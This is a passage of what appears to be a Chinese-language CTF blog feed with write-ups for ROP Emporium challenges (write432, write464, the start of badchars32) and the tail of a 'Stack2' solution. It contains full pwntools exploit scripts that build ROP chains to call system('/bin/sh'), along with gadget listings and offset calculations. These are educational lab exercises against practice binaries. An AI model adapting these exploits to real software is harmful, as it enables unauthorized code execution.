r<span class="token punctuation">(</span>offset<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">)</span>
r<span class="token punctuation">(</span>offset<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">)</span>
r<span class="token punctuation">(</span>offset<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'5. exit\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>这里要注意 我这里并未直接调用bash函数而是自己构造了个system(‘sh’)</p>
<p>构造也很简单 return地址修改为system.plt 地址 、抬高地址在system()前写入参数sh地址</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>rodata<span class="token punctuation">:</span><span class="token number">08048980</span> <span class="token punctuation">;</span> <span class="token keyword">char</span> command<span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token punctuation">.</span>rodata<span class="token punctuation">:</span><span class="token number">08048980</span> command         db <span class="token string">'/bin/bash'</span><span class="token punctuation">,</span><span class="token number">0</span>        <span class="token punctuation">;</span> DATA XREF<span class="token punctuation">:</span> hackhere<span class="token operator">+</span><span class="token number">14</span>↑o
<span class="token punctuation">.</span>rodata<span class="token punctuation">:</span>0804898A                 align <span class="token number">4</span>
</code></pre>
<p>可以看到/bin/bash地址为0x8048980</p>
<p>所以可以推出sh的地址0x8048987</p>
<p>写入即可完成利用</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Stack2&quot;&gt;&lt;a href=&quot;#Stack2&quot; class=&quot;headerlink&quot; title=&quot;Stack2&quot;&gt;&lt;/a&gt;Stack2&lt;/h2&gt;&lt;p&gt;知识点&lt;/p&gt;
&lt;p&gt;大小端序&lt;/p&gt;
&lt;p&gt;大端模式（Big-endian）：高位字节排放在内存的低地址端
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ROPEmporium-WriteUp</title>
    <link href="http://iosmosis.github.io/2018/07/12/ROPEmporium-WriteUp/"/>
    <id>http://iosmosis.github.io/2018/07/12/ROPEmporium-WriteUp/</id>
    <published>2018-07-12T09:35:36.000Z</published>
    <updated>2018-07-13T17:53:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看堆系列 最近的wp都是大家有疑惑 我自己也有点不明白的题目 所以再次记录</p>
<h2 id="write432"><a href="#write432" class="headerlink" title="write432"></a>write432</h2><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ checksec write432
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/write432'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre>
<p>NX 开启</p>
<p>载入ida分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"write4 by ROP Emporium"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"32bits\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">pwnme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nExiting"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>看到main函数中调用了一个pwnme() 猜测漏洞应该在此</p>
<p>跟进查看pwnme</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">pwnme</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>

  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Go ahead and give me the string already!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在漏洞</span>
<span class="token punctuation">}</span>
</code></pre>
<p>程序没有提供shell 但是调用了system</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">usefulFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/ls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里调用/bin/ls  但是我们想要的是/bin/sh  所以我们要利用rop想办法构造/bin/sh 并参给system</p>
<p>尝试使用ROPgadget搜索</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ ROPgadget --binary write432 --only <span class="token string">"pop|ret"</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x080486db <span class="token keyword">:</span> pop ebp <span class="token punctuation">;</span> ret
0x080486d8 <span class="token keyword">:</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
0x080483e1 <span class="token keyword">:</span> pop ebx <span class="token punctuation">;</span> ret
0x080486da <span class="token keyword">:</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
0x080486d9 <span class="token keyword">:</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
0x0804819d <span class="token keyword">:</span> ret
0x080484fe <span class="token keyword">:</span> ret 0xeac1

Unique gadgets found: 7
</code></pre>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ ROPgadget --binary write432 --only <span class="token string">"mov|ret"</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x08048547 <span class="token keyword">:</span> mov al, byte ptr <span class="token punctuation">[</span>0xc9010804<span class="token punctuation">]</span> <span class="token punctuation">;</span> ret
0x08048670 <span class="token keyword">:</span> mov dword ptr <span class="token punctuation">[</span>edi<span class="token punctuation">]</span>, ebp <span class="token punctuation">;</span> ret
0x080484b0 <span class="token keyword">:</span> mov ebx, dword ptr <span class="token punctuation">[</span>esp<span class="token punctuation">]</span> <span class="token punctuation">;</span> ret
0x0804819d <span class="token keyword">:</span> ret
0x080484fe <span class="token keyword">:</span> ret 0xeac1

Unique gadgets found: 5
ubuntu@ubuntu:~$ 
<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data-lang<span class="token operator">=</span><span class="token string">""</span> data-line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data-trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data-label_position<span class="token operator">=</span><span class="token string">"outer"</span> data-labels_left<span class="token operator">=</span><span class="token string">""</span> data-labels_right<span class="token operator">=</span><span class="token string">""</span> data-labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
</code></pre>
<h4 id="ROP构造思路"><a href="#ROP构造思路" class="headerlink" title="ROP构造思路"></a>ROP构造思路</h4><p>先计算偏移 </p>
<pre class=" language-python"><code class="language-python">gef➤  p<span class="token operator">/</span>d <span class="token number">0x28</span><span class="token operator">+</span><span class="token number">4</span>
$<span class="token number">5</span> <span class="token operator">=</span> <span class="token number">44</span>
</code></pre>
<p>得到偏移为44</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">pop_edi_ebp<span class="token operator">=</span><span class="token number">0x080486da</span> <span class="token comment" spellcheck="true"># pop edi ; pop ebp ; ret</span>
mov_ret<span class="token operator">=</span><span class="token number">0x08048670</span> <span class="token comment" spellcheck="true"># mov dword ptr [edi], ebp ; ret</span>
system_plt<span class="token operator">=</span><span class="token number">0x8048430</span>
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取bss段地址</span>


payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/sh"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
</code></pre>
<p>因为32位寄存器最多只能写4字节，而/bin/sh为7字节 所以我们分两次写入</p>
<p>覆盖偏移到ret + 覆盖ret为pop_edi_ebp+将bss地址写入edi+将/bin写入ebp+将ebp的内容写入bss段</p>
<p>覆盖ret到pop_edi_ebp+将bss+4的地址写入edi(因为bss段前4个地址写入了/bin所以这里为了拼接从bss+4的位置开始写入)+将/sh写入ebp+将ebp的内容写入bss段</p>
<p>覆盖返回地址为system地址+写如system返回地址 可以任意写 +system调用参数的地址 此处存放地址为bss</p>
<h3 id="所以可以得到exp"><a href="#所以可以得到exp" class="headerlink" title="所以可以得到exp"></a>所以可以得到exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'write432'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'write432'</span><span class="token punctuation">)</span>

bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
pop_edi_ebp<span class="token operator">=</span><span class="token number">0x080486da</span>
mov_ret<span class="token operator">=</span><span class="token number">0x08048670</span>
system_plt<span class="token operator">=</span><span class="token number">0x8048430</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/sh\x00"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试运行</p>
<p><img src="/2018/07/12/ROPEmporium-WriteUp/1.jpg" alt="1"></p>
<h2 id="write464"><a href="#write464" class="headerlink" title="write464"></a>write464</h2><p>题目基本流程和上一道类似</p>
<p>所以这里直接从ROP构造开始讲解</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">gef➤  p<span class="token operator">/</span>d <span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span>
$<span class="token number">2</span> <span class="token operator">=</span> <span class="token number">40</span>
</code></pre>
<p>所以得到偏移为40</p>
<p>尝试用ROPgadget搜索可用的gadget</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ ROPgadget --binary write4 --only <span class="token string">"pop|mov|ret"</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x0000000000400713 <span class="token keyword">:</span> mov byte ptr <span class="token punctuation">[</span>rip + 0x20096e<span class="token punctuation">]</span>, 1 <span class="token punctuation">;</span> ret
0x0000000000400821 <span class="token keyword">:</span> mov dword ptr <span class="token punctuation">[</span>rsi<span class="token punctuation">]</span>, edi <span class="token punctuation">;</span> ret
0x00000000004007ae <span class="token keyword">:</span> mov eax, 0 <span class="token punctuation">;</span> pop rbp <span class="token punctuation">;</span> ret
0x0000000000400820 <span class="token keyword">:</span> mov qword ptr <span class="token punctuation">[</span>r14<span class="token punctuation">]</span>, r15 <span class="token punctuation">;</span> ret
0x000000000040088c <span class="token keyword">:</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040088e <span class="token keyword">:</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400890 <span class="token keyword">:</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400892 <span class="token keyword">:</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400712 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> mov byte ptr <span class="token punctuation">[</span>rip + 0x20096e<span class="token punctuation">]</span>, 1 <span class="token punctuation">;</span> ret
0x000000000040088b <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040088f <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004006b0 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret
0x0000000000400893 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret
0x0000000000400891 <span class="token keyword">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040088d <span class="token keyword">:</span> pop rsp <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004005b9 <span class="token keyword">:</span> ret

Unique gadgets found: 16
</code></pre>
<p>接下来进行构造</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">pop_r14_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400890</span> <span class="token comment" spellcheck="true"># pop r14 ; pop r15 ; ret</span>
mov_ret <span class="token operator">=</span> <span class="token number">0x0000000000400820</span> <span class="token comment" spellcheck="true"># mov qword ptr [r14], r15 ; ret</span>
pop_rdi<span class="token operator">=</span><span class="token number">0x0000000000400893</span> <span class="token comment" spellcheck="true"># pop rdi ; ret</span>
system_plt <span class="token operator">=</span><span class="token number">0x00000000004005E0</span>
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取bss段地址</span>

payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_r14_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span>
</code></pre>
<p>因为64位下可写入8字节而/bin/sh为7字节所以可以一次写入</p>
<p>覆盖偏移到ret+覆盖ret为pop_r14_r15+将bss地址写入r14+将/bin/sh\x00写入r15+将r15内容写到r14(bss)处</p>
<p>由于64位所以binsh地址参数需要放在rdi寄存器中，覆盖ret为pop_rdi+将bss地址写入rdi+写入system并调用rdi参数</p>
<h3 id="所以可以构造exp"><a href="#所以可以构造exp" class="headerlink" title="所以可以构造exp"></a>所以可以构造exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'write4'</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'write4'</span><span class="token punctuation">)</span>
pop_r14_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400890</span>
mov_ret <span class="token operator">=</span> <span class="token number">0x0000000000400820</span> 
system_plt <span class="token operator">=</span><span class="token number">0x00000000004005E0</span>
pop_rdi<span class="token operator">=</span><span class="token number">0x0000000000400893</span>
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_r14_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试运行</p>
<p><img src="/2018/07/12/ROPEmporium-WriteUp/2.jpg" alt="2"></p>
<p>成功获得shell</p>
<h2 id="badchars32"><a href="#badchars32" class="headerlink" title="badchars32"></a>badchars32</h2><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ checksec badchars32
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/badchars32'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre>
<p>NX开启 32位程序</p>
<p>载入ida分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"badchars by ROP Emporium"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"32bits\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">pwnme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nExiting"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>看到main函数调用了pwnme函数 所以我们跟进看下</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">pwnme</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>
  <span class="token keyword">int</span> n<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST18_4</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-2Ch]</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-28h]</span>

  s <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x200u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>s <span class="token punctuation">)</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x200u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"badchars are: b i c / &lt;space> f n s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
